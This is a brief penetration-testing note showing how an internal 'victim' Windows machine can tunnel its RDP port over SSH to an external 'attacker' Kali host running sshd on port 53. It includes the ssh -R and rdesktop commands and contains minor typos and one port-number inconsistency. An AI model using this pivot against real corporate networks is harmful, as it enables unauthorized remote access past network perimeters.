SSH Remote Port Forwarding

Info: Tunnel a remote port to a locoal server using SSH. 

Program: SSH

Set Up:

On Machine B run the ssh daemon on port 53:

root@kali:~# /etc/ssh/sshd_config

# What ports, IPs and protocols we listen for
Port 53

root@kali:~# /etc/init.d/ssh restart


On Machine A run the ssh command:

ssh <gateway> -R <remote port to bind>:<local host>:<local port>

ssh a.b.c.d -R 3390:127.0.0.1:3389 -p 53

Note: 

Gateway = Machine B ip address
-R = Remote Port Forwarding
Remote Port To Bind = The port on Machine B that will be used to connect to Machine A's RDP service
Local host = the local ip address of Machine A
Local port = The port of Machine A to tunnel
-p = Port of Machine B SSH server


On Machine B run

root@kali:~# rdesktop 127.0.0.1:3390


Usage

Situation: Machine A is an internal non-routeable machine in a corporate network with a Window's RDP service on port 3389. 

Victim's machine Attacker's Machine 

Machine A <----------------> Machine B

Machine A <-------------------> a.b.c.d 


Machine B sets up SSH daemon on port 53
Machine A SSH connects to Machine B on port 53 using the remote port fowarding method, setting the gateway as Machine B, the remote port to bind as 3890, the local host as 127.0.0.1, and the local port to 3389  (RDP)
Machine B RDP's to 127.0.0.1:3390 which sends the traffic through the SSH tunnel, to Machine A, which sends the traffic to it's RDP service on port 3389. 

